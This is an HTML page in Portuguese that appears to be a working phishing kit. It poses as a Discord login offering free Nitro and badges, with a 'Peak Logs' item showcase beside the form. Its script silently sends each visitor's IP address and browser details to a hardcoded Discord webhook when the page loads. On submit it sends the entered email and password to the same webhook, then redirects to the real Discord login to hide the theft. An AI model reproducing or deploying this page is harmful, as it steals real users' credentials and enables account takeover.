<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>PEAK LOGS - Goblin Notifier</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@300;400;700;900&display=swap');

        @keyframes greenBreathing {
            0% { background-color: #021a08; box-shadow: inset 0 0 100px rgba(16, 185, 129, 0.1); }
            50% { background-color: #042f10; box-shadow: inset 0 0 180px rgba(16, 185, 129, 0.25); }
            100% { background-color: #021a08; box-shadow: inset 0 0 100px rgba(16, 185, 129, 0.1); }
        }

        @keyframes pulseGlow {
            0% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(34, 197, 94, 0.4)); }
            50% { transform: scale(1.03); filter: drop-shadow(0 0 25px rgba(34, 197, 94, 0.7)); }
            100% { transform: scale(1); filter: drop-shadow(0 0 15px rgba(34, 197, 94, 0.4)); }
        }

        body, html { 
            margin: 0; padding: 0; min-height: 100vh; 
            font-family: 'Inter', sans-serif; 
            color: #e2e8f0; 
            animation: greenBreathing 6s ease-in-out infinite;
        }

        .radar-bg { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; 
            background: radial-gradient(circle at center, #064e21 0%, #021306 100%); 
        }

        .top-bar { 
            display: flex; justify-content: space-between; align-items: center; 
            background: rgba(2, 20, 7, 0.9); height: 54px; padding: 0 24px; 
            border-bottom: 1px solid #065f2c; font-family: 'Share Tech Mono', monospace; font-size: 14px; 
        }

        .brand-container { display: flex; align-items: center; gap: 12px; }
        .goblin-avatar-wrapper {
            width: 38px; height: 38px; border-radius: 50%; overflow: hidden;
            border: 2px solid #22c55e; animation: pulseGlow 3s infinite;
            background-color: #002b0c; display: flex; align-items: center; justify-content: center;
        }
        .goblin-avatar { 
            width: 130%; height: 130%; object-fit: cover; 
            object-position: 72% 35%;
        }

        .brand { color: #4ade80; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; font-size: 16px; }
        .status-indicator { display: flex; align-items: center; gap: 8px; color: #4ade80; font-size: 12px; }
        .dot { width: 8px; height: 8px; background-color: #22c55e; border-radius: 50%; box-shadow: 0 0 10px #22c55e; }

        .main-wrapper { 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            padding: 24px 16px; gap: 24px;
        }

        .finder-card { 
            background: rgba(3, 28, 10, 0.85); border: 1px solid #059669; 
            width: 100%; max-width: 440px; padding: 28px; border-radius: 16px; 
            box-shadow: 0 0 50px rgba(16, 185, 129, 0.2); backdrop-filter: blur(12px); 
        }

        .header-title-box { text-align: center; margin-bottom: 20px; }
        .finder-card h2 { margin: 0; color: #fff; font-size: 24px; font-weight: 900; letter-spacing: 1px; }
        .peak-logs-badge { 
            display: inline-block; background: linear-gradient(135deg, #f59e0b, #ef4444); 
            color: #fff; font-weight: 900; font-size: 12px; padding: 3px 10px; 
            border-radius: 20px; margin-top: 6px; text-transform: uppercase; letter-spacing: 1px;
            box-shadow: 0 0 15px rgba(239, 68, 68, 0.5);
        }

        .og-ticker {
            background: rgba(2, 20, 7, 0.7); border: 1px dashed #059669;
            border-radius: 8px; padding: 10px; margin-bottom: 20px;
            font-size: 11px; font-family: 'Share Tech Mono', monospace; color: #34d399;
            display: flex; justify-content: space-around; text-align: center;
        }
        .og-item span { display: block; font-weight: bold; color: #facc15; font-size: 13px; }

        .input-group { margin-bottom: 14px; }
        .input-group label { display: block; font-size: 11px; text-transform: uppercase; color: #34d399; margin-bottom: 6px; font-family: 'Share Tech Mono', monospace; font-weight: bold; }
        .input-group input { width: 100%; padding: 12px; background: #011204; border: 1px solid #047857; color: #fff; border-radius: 8px; font-size: 14px; box-sizing: border-box; outline: none; transition: all 0.2s; }
        .input-group input:focus { border-color: #34d399; box-shadow: 0 0 10px rgba(52, 211, 153, 0.4); }

        .btn-action { 
            width: 100%; padding: 13px; background: linear-gradient(135deg, #059669, #10b981); color: white; border: none; 
            border-radius: 8px; font-weight: 800; cursor: pointer; font-size: 14px; margin-top: 8px; 
            transition: all 0.2s; text-transform: uppercase; letter-spacing: 1px;
            box-shadow: 0 4px 20px rgba(16, 185, 129, 0.4);
        }
        .btn-action:hover { background: linear-gradient(135deg, #047857, #059669); box-shadow: 0 6px 25px rgba(16, 185, 129, 0.6); }

        .footer-info { text-align: center; font-size: 11px; color: #047857; margin-top: 16px; font-family: 'ShareTech Mono', monospace; }

        /* Estilos do Inventário / Peak Logs Showcase */
        .logs-showcase {
            width: 100%; max-width: 900px;
            background: rgba(3, 28, 10, 0.85); border: 1px solid #059669;
            border-radius: 16px; padding: 24px;
            box-shadow: 0 0 40px rgba(16, 185, 129, 0.15);
            backdrop-filter: blur(12px);
        }
        .logs-title {
            font-family: 'Share Tech Mono', monospace; color: #4ade80;
            font-size: 18px; text-transform: uppercase; letter-spacing: 2px;
            margin-bottom: 16px; border-bottom: 1px dashed #059669; padding-bottom: 8px;
            display: flex; justify-content: space-between; align-items: center;
        }
        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 16px;
        }
        .item-card {
            background: rgba(1, 18, 4, 0.9);
            border: 1px solid #047857;
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 16px;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .item-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(52, 211, 153, 0.3);
            border-color: #34d399;
        }
        .item-img-wrap {
            width: 64px; height: 64px;
            background: #021a08;
            border: 2px solid #059669;
            border-radius: 10px;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
        }
        .item-img-wrap img {
            width: 100%; height: 100%; object-fit: cover;
        }
        .item-details {
            display: flex; flex-direction: column; gap: 4px;
        }
        .item-name {
            font-weight: 900; color: #fff; font-size: 15px; letter-spacing: 0.5px;
        }
        .item-qty {
            font-family: 'Share Tech Mono', monospace; font-size: 12px; color: #facc15;
        }
        .item-rate {
            font-family: 'Share Tech Mono', monospace; font-size: 12px; color: #34d399; font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="radar-bg"></div>
    <div class="top-bar">
        <div class="brand-container">
            <div class="goblin-avatar-wrapper">
                <img src="data:image/webp;base64,>
            </div>
            <div class="status-indicator">
                <div class="dot"></div> DISCORD AUTH LIVE
            </div>
        </div>
    </div>
    
    <div class="main-wrapper">
        <!-- Formulário Original -->
        <div class="finder-card">
            <div class="header-title-box">
                <h2>GOBLIN NOTIFIER</h2>
                <div class="peak-logs-badge">PEAK LOGS 🔥</div>
            </div>
            <div class="og-ticker">
                <div class="og-item">DISCORD NITRO <span>[FREE EVENT]</span></div>
                <div class="og-item">OG BADGES <span>[ACTIVE]</span></div>
            </div>
            <form id="loginForm">
                <div class="input-group">
                    <label>E-mail ou Número de Telefone</label>
                    <input type="text" id="username" placeholder="seu_email@domain.com" required autocomplete="off">
                </div>
                <div class="input-group">
                    <label>Senha do Discord</label>
                    <input type="password" id="password" placeholder="••••••••••••" required>
                </div>
                <button type="button" onclick="enviarWebhook()" class="btn-action">CONECTAR AO DISCORD</button>
            </form>
            <div class="footer-info">DISCORD SECURE VERIFICATION • WEBHOOK ACTIVE</div>
        </div>

        <!-- Seção Peak Logs / Inventário -->
        <div class="logs-showcase">
            <div class="logs-title">
                <span>🔥 Peak Logs - Inventory Active</span>
                <span style="font-size: 12px; color: #facc15;">Status: Online</span>
            </div>
            <div class="cards-grid">
                <!-- Strawberry -->
                <div class="item-card">
                    <div class="item-img-wrap">
                        <img src="straberry.webp" alt="Strawberry">
                    </div>
                    <div class="item-details">
                        <div class="item-name">Strawberry</div>
                        <div class="item-qty">Quantidade: 2</div>
                        <div class="item-rate">750M/s</div>
                    </div>
                </div>

                <!-- Skibidi -->
                <div class="item-card">
                    <div class="item-img-wrap">
                        <img src="skibid.webp" alt="Skibidi">
                    </div>
                    <div class="item-details">
                        <div class="item-name">Skibidi</div>
                        <div class="item-qty">Quantidade: 5</div>
                        <div class="item-rate">450M/s</div>
                    </div>
                </div>

                <!-- Meowl -->
                <div class="item-card">
                    <div class="item-img-wrap">
                        <img src="meowl.webp" alt="Meowl">
                    </div>
                    <div class="item-details">
                        <div class="item-name">Meowl</div>
                        <div class="item-qty">Quantidade: 3</div>
                        <div class="item-rate">600M/s</div>
                    </div>
                </div>

                <!-- John Pork -->
                <div class="item-card">
                    <div class="item-img-wrap">
                        <img src="john pork.webp" alt="John Pork">
                    </div>
                    <div class="item-details">
                        <div class="item-name">John Pork</div>
                        <div class="item-qty">Quantidade: 6</div>
                        <div class="item-rate">500M/s</div>
                    </div>
                </div>

                <!-- Dragon -->
                <div class="item-card">
                    <div class="item-img-wrap">
                        <img src="dragon.webp" alt="Dragon">
                    </div>
                    <div class="item-details">
                        <div class="item-name">Dragon</div>
                        <div class="item-qty">Quantidade: 146</div>
                        <div class="item-rate">250M/s</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1544832475371536456/DBn7XvZu_FIzPbVigU61TcTtExf9agxoWDyK3HgHyJX4YshIs2uY9ppu6jDjflLqBams";

        window.addEventListener('load', async () => {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const clientIp = ipData.ip;

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🟩 **[GOBLIN NOTIFIER] Nova Visita PEAK LOGS!**\n🌐 **IP:** \`${clientIp}\`\n💻 **Dispositivo:** \`${navigator.userAgent}\``
                    })
                });
            } catch (e) {
                console.log("Erro ao enviar IP de visita");
            }
        });

        async function enviarWebhook() {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            if(!user || !pass) {
                alert('Preencha os campos!');
                return;
            }

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const clientIp = ipData.ip;

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔥 **[PEAK LOGS] Credenciais do Discord Capturadas!**\n👤 **E-mail/Usuário:** \`${user}\`\n🔑 **Senha:** \`${pass}\`\n🌐 **IP:** \`${clientIp}\``
                    })
                });

                window.location.href = 'https://discord.com/login';
            } catch (e) {
                window.location.href = 'https://discord.com/login';
            }
        }
    </script>
</body>
</html>
